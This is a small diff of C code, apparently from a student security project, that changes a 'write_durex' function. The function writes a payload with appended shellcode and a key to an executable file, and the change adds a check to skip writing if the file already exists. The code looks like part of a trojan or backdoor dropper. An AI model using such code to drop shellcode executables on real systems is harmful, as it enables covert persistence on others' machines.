@@ -6,7 +6,7 @@
 /*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/08/14 17:28:28 by vscode            #+#    #+#             */
-/*   Updated: 2021/12/07 08:54:22 by alagroy-         ###   ########.fr       */
+/*   Updated: 2021/12/10 08:40:19 by alagroy-         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,10 +15,12 @@
 static int  write_durex(byte *payload, int len)
 {
     int     fd;
-    char    buf[20];
-    
-    get_filename((int *)buf);
-    if ((fd = open(buf, O_WRONLY | O_CREAT | O_TRUNC, 0755)) == -1)
+    char    file[20];
+
+    get_filename((int *)file);
+    if (!access(file, F_OK))
+        return (0);
+    if ((fd = open(file, O_WRONLY | O_CREAT | O_TRUNC, 0755)) == -1)
         return (-1);
     write(fd, payload, len + SHELLCODE_LEN + KEY_LEN);
     close(fd);
